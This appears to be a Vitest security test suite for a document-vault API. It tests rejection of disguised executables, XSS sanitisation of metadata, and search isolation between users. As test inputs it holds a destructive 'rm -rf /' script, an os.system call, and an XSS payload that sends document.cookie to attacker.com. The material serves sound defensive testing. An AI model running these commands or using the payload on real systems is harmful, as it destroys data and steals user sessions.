/**
 * TrustVault Backend - Stage 7 Security Test Suite
 * Validates:
 * 1. Scoped search and zero metadata leakage across isolation boundaries
 * 2. Magic number and file signature validation (disguised executables and scripts)
 * 3. Automatic disk purge of rejected/malicious uploads
 * 4. Input sanitization neutralizing XSS payloads in titles, notes, and tags
 */

import { describe, it, expect, beforeEach, afterAll } from 'vitest';
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createApp } from '../src/app.js';
import { User } from '../src/models/user.model.js';
import { Document } from '../src/models/document.model.js';
import { generateToken } from '../src/utils/token.js';
import { STORAGE_DIR } from '../src/middleware/upload.middleware.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const testFilesDir = path.resolve(__dirname, 'test-files-stage7');

describe('Stage 7: Search, Metadata Indexing, and Upload Validation', () => {
  const app = createApp();

  let userAToken, userAId;
  let userBToken, userBId;
  let adminToken, adminId;

  beforeEach(async () => {
    User.clearInMemory();
    Document.clearInMemory();

    if (!fs.existsSync(testFilesDir)) {
      fs.mkdirSync(testFilesDir, { recursive: true });
    }

    // Register User A (Alice - Department Lead)
    const resA = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Alice Lead',
        email: 'alice@example.com',
        password: 'Password123!',
      });
    userAToken = resA.body.data.token;
    userAId = resA.body.data.user._id || resA.body.data.user.id;

    // Register User B (Bob - External Auditor / Peer)
    const resB = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Bob Auditor',
        email: 'bob@example.com',
        password: 'Password123!',
      });
    userBToken = resB.body.data.token;
    userBId = resB.body.data.user._id || resB.body.data.user.id;

    // Seed Admin user directly in DB (mitigating THREAT-06 privilege escalation)
    const adminUser = await User.create({
      name: 'Super Admin',
      email: 'admin@trustvault.internal',
      passwordHash: 'seededadminhash',
      role: 'admin',
    });
    adminId = adminUser._id || adminUser.id;
    adminToken = generateToken(adminUser);
  });

  afterAll(() => {
    if (fs.existsSync(testFilesDir)) {
      fs.rmSync(testFilesDir, { recursive: true, force: true });
    }
  });

  describe('File Signature & Magic Number Security Enforcement', () => {
    it('CRITICAL: Should reject a malicious shell script disguised as .png with 415 Unsupported Media Type', async () => {
      const fakePngPath = path.join(testFilesDir, 'malicious-exploit.png');
      fs.writeFileSync(fakePngPath, '#!/bin/bash\nrm -rf / --no-preserve-root\n');

      const res = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Company Logo')
        .attach('file', fakePngPath);

      expect(res.status).toBe(415);
      expect(res.body.error).toBeDefined();
      expect(res.body.error.code).toBe('UNSUPPORTED_MEDIA_TYPE');
      expect(res.body.error.message).toMatch(/signature|executable|shebang/i);

      // Verify no orphaned malicious file was retained in storage directory
      const storedFiles = fs.readdirSync(STORAGE_DIR);
      const leakedOrphan = storedFiles.some((f) => {
        try {
          const content = fs.readFileSync(path.join(STORAGE_DIR, f), 'utf8');
          return content.includes('rm -rf');
        } catch {
          return false;
        }
      });
      expect(leakedOrphan).toBe(false);
    });

    it('CRITICAL: Should reject a Windows PE executable (.exe) renamed as .pdf with 415', async () => {
      const fakePdfPath = path.join(testFilesDir, 'quarterly-report.pdf');
      // Windows PE starts with 'MZ' (0x4D, 0x5A)
      const peBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      fs.writeFileSync(fakePdfPath, peBuffer);

      const res = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Quarterly Financials')
        .attach('file', fakePdfPath);

      expect(res.status).toBe(415);
      expect(res.body.error.code).toBe('UNSUPPORTED_MEDIA_TYPE');
      expect(res.body.error.message).toMatch(/executable signature/i);
    });

    it('CRITICAL: Should reject a Linux ELF binary renamed as .docx with 415', async () => {
      const fakeDocxPath = path.join(testFilesDir, 'memo.docx');
      // Linux ELF starts with 0x7F, 'E', 'L', 'F'
      const elfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
      fs.writeFileSync(fakeDocxPath, elfBuffer);

      const res = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Project Memo')
        .attach('file', fakeDocxPath);

      expect(res.status).toBe(415);
      expect(res.body.error.code).toBe('UNSUPPORTED_MEDIA_TYPE');
    });

    it('CRITICAL: Should reject text file containing binary null bytes or shell shebang', async () => {
      const shebangTxtPath = path.join(testFilesDir, 'run.txt');
      fs.writeFileSync(shebangTxtPath, '#!/usr/bin/env python3\nimport os\nos.system("id")\n');

      const res = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Python Run Script')
        .attach('file', shebangTxtPath);

      expect(res.status).toBe(415);
      expect(res.body.error.code).toBe('UNSUPPORTED_MEDIA_TYPE');
    });

    it('should successfully upload genuine PDF, PNG, and Text documents with valid signatures', async () => {
      // Valid PDF
      const validPdfPath = path.join(testFilesDir, 'legit.pdf');
      fs.writeFileSync(validPdfPath, '%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF');

      const pdfRes = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Legitimate Security Policy')
        .field('tags', 'security, policy')
        .attach('file', validPdfPath);

      expect(pdfRes.status).toBe(201);
      expect(pdfRes.body.document.originalName).toBe('legit.pdf');

      // Valid PNG (89 50 4E 47 0D 0A 1A 0A)
      const validPngPath = path.join(testFilesDir, 'valid.png');
      const pngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
      fs.writeFileSync(validPngPath, pngHeader);

      const pngRes = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Corporate Seal')
        .attach('file', validPngPath);

      expect(pngRes.status).toBe(201);
      expect(pngRes.body.document.originalName).toBe('valid.png');
    });
  });

  describe('Input Sanitization & Schema Validation', () => {
    it('should neutralize XSS payloads (<script>, onerror=) in title and description during upload', async () => {
      const samplePath = path.join(testFilesDir, 'safe-notes.txt');
      fs.writeFileSync(samplePath, 'Clean business notes without exploits');

      const res = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Quarterly Review <script>alert("XSS")</script>')
        .field('description', 'Report summary <img src=x onerror=fetch("http://attacker.com?c="+document.cookie)>')
        .field('tags', 'review, <script>evil</script>, sanitized-tag')
        .attach('file', samplePath);

      expect(res.status).toBe(201);
      const doc = res.body.document;
      // Script and HTML tags stripped
      expect(doc.title).toBe('Quarterly Review');
      expect(doc.description).not.toContain('<script>');
      expect(doc.description).not.toContain('onerror=');
      expect(doc.description).toBe('Report summary');
      expect(doc.tags).toContain('review');
      expect(doc.tags).toContain('sanitized-tag');
      expect(doc.tags).not.toContain('<script>evil</script>');
    });

    it('should reject upload when title consists exclusively of dangerous script tags', async () => {
      const samplePath = path.join(testFilesDir, 'safe-text.txt');
      fs.writeFileSync(samplePath, 'Valid file content');

      const res = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', '<script>alert(1)</script>')
        .attach('file', samplePath);

      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should sanitize metadata updates in PATCH /api/documents/:id', async () => {
      const samplePath = path.join(testFilesDir, 'doc-to-update.txt');
      fs.writeFileSync(samplePath, 'Metadata update test text');

      const uploadRes = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Initial Title')
        .attach('file', samplePath);

      const docId = uploadRes.body.document._id;

      const patchRes = await request(app)
        .patch(`/api/documents/${docId}`)
        .set('Authorization', `Bearer ${userAToken}`)
        .send({
          title: 'Updated Safe Title <b onmouseover=alert(1)>bold</b>',
          description: 'Updated description with javascript:void(0)',
          tags: ['financials', 'javascript:alert(1)', 'q4'],
        });

      expect(patchRes.status).toBe(200);
      expect(patchRes.body.document.title).toBe('Updated Safe Title bold');
      expect(patchRes.body.document.description).not.toContain('javascript:');
      expect(patchRes.body.document.tags).toContain('financials');
      expect(patchRes.body.document.tags).toContain('q4');
    });
  });

  describe('Scoped Search & Zero Metadata Leakage', () => {
    let docAliceSecretId;
    let docSharedId;

    beforeEach(async () => {
      // Alice creates a highly confidential document
      const secretPath = path.join(testFilesDir, 'secret-strategy.pdf');
      fs.writeFileSync(secretPath, '%PDF-1.5 Project Pegasus Super-Secret M&A Acquisition Strategy');

      const resSecret = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Project Pegasus Acquisition')
        .field('description', 'Confidential valuation of target entity')
        .field('tags', 'pegasus, confidential, m&a')
        .attach('file', secretPath);

      docAliceSecretId = resSecret.body.document._id;

      // Alice creates a shared collaboration document
      const sharedPath = path.join(testFilesDir, 'public-handbook.pdf');
      fs.writeFileSync(sharedPath, '%PDF-1.4 Employee security onboarding handbook');

      const resShared = await request(app)
        .post('/api/documents')
        .set('Authorization', `Bearer ${userAToken}`)
        .field('title', 'Employee Security Onboarding')
        .field('description', 'General staff handbook and security guidelines')
        .field('tags', 'handbook, onboarding, policy')
        .attach('file', sharedPath);

      docSharedId = resShared.body.document._id;

      // Grant Bob read access only to the shared handbook
      await request(app)
        .post(`/api/documents/${docSharedId}/permissions`)
        .set('Authorization', `Bearer ${userAToken}`)
        .send({
          userId: userBId,
          permissionLevel: 'read',
        });
    });

    it('CRITICAL: Searching a confidential term present only in User A\'s private doc returns 0 results for User B', async () => {
      // Bob searches for "Pegasus"
      const res = await request(app)
        .get('/api/documents/search?q=Pegasus')
        .set('Authorization', `Bearer ${userBToken}`);

      expect(res.status).toBe(200);
      expect(res.body.query).toBe('Pegasus');
      expect(res.body.total).toBe(0);
      expect(res.body.documents).toHaveLength(0);

      // Verify no document ID, title, or tags leaked in response
      const responseStr = JSON.stringify(res.body);
      expect(responseStr).not.toContain('Project Pegasus');
      expect(responseStr).not.toContain('Confidential valuation');
      expect(responseStr).not.toContain(docAliceSecretId);
    });

    it('should return matching document when Owner (Alice) searches for confidential term', async () => {
      const res = await request(app)
        .get('/api/documents/search?q=Pegasus')
        .set('Authorization', `Bearer ${userAToken}`);

      expect(res.status).toBe(200);
      expect(res.body.total).toBe(1);
      expect(res.body.documents[0]._id).toBe(docAliceSecretId);
      expect(res.body.documents[0].title).toBe('Project Pegasus Acquisition');
      expect(res.body.documents[0].accessLevel).toBe('Owner');
    });

    it('should allow Bob to find the document explicitly shared with him', async () => {
      const res = await request(app)
        .get('/api/documents/search?q=Onboarding')
        .set('Authorization', `Bearer ${userBToken}`);

      expect(res.status).toBe(200);
      expect(res.body.total).toBe(1);
      expect(res.body.documents[0]._id).toBe(docSharedId);
      expect(res.body.documents[0].title).toBe('Employee Security Onboarding');
      expect(res.body.documents[0].accessLevel).toBe('Reader');
    });

    it('should support search filtering by tags', async () => {
      const res = await request(app)
        .get('/api/documents/search?tags=onboarding')
        .set('Authorization', `Bearer ${userBToken}`);

      expect(res.status).toBe(200);
      expect(res.body.total).toBe(1);
      expect(res.body.documents[0].title).toBe('Employee Security Onboarding');
    });

    it('should allow Administrator governance access to search across all vault documents', async () => {
      const res = await request(app)
        .get('/api/documents/search?q=Pegasus')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(res.status).toBe(200);
      expect(res.body.total).toBe(1);
      expect(res.body.documents[0]._id).toBe(docAliceSecretId);
      expect(res.body.documents[0].accessLevel).toBe('Admin');
    });

    it('should require authentication for search endpoint', async () => {
      const res = await request(app).get('/api/documents/search?q=test');
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('UNAUTHORIZED');
    });
  });
});
